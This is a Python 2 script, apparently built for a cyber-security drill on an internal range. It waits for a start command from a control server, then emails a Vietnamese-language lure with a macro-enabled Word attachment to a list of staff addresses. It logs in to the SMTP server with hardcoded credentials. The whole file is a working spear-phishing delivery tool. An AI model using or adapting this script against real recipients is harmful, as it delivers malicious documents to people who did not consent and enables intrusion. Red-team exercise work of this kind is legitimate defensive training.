import smtplib
import os
import urllib2
import time
from email.Utils import formatdate
from email.mime.text import MIMEText
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email import Encoders
import random

def wait(t):
	while True:
		try:
			r = urllib2.urlopen('http://192.168.100.169/isAttack/KB15_macro')
			if (int(r.read()) != 0):
				break
		except:
			pass
		time.sleep(t)
	return

def main():
	path = 'C:/Python27/Script/kb15/'
	os.chdir(path)

	print 'Waiting for start command'
	wait(5)
	print 'Revc start command'

	userlist = ['bao@dientap.cnsc', 'thth@dientap.cnsc', 'danh@dientap.cnsc', 'hoang@dientap.cnsc', 'thuy@dientap.cnsc', 'duy@dientap.cnsc', 'khoa@dientap.cnsc', 'vuong@dientap.cnsc', 'bac@dientap.cnsc', 'hieu@dientap.cnsc', 'nguyenvand@dientap.cnsc', 'nguyenvane@dientap.cnsc']

	for user in userlist:
#		me = 'nguyenvanc@cnsc.com'
		me = 'nguyenvanh@cnsc.com'
		you = user

		msg = MIMEMultipart()
		msg['From'] = me
		msg['To'] = you
		msg['Subject'] = 'Subject'
		msg['Date'] = formatdate(localtime=True)

		# noi dung email
		text = 'Gửi các anh/chị thông báo quan trọng đầu năm.'
		msg.attach(MIMEText(text))

		# attachment file setup.rar
		file = 'ThongBao.docm'
		part = MIMEBase('application', "octet-stream")
		part.set_payload( open(file,"rb").read() )
		Encoders.encode_base64(part)
		part.add_header('Content-Disposition', 'attachment; filename="%s"'
		               % os.path.basename(file))
		msg.attach(part)


		s = smtplib.SMTP('192.168.100.251')
		s.login(me, 'Cnsc12345')
		s.sendmail(me, you, msg.as_string())
		s.quit()
		print 'Send to ' + user
		time.sleep(random.randint(1,2))

	print 'Send done'

main()
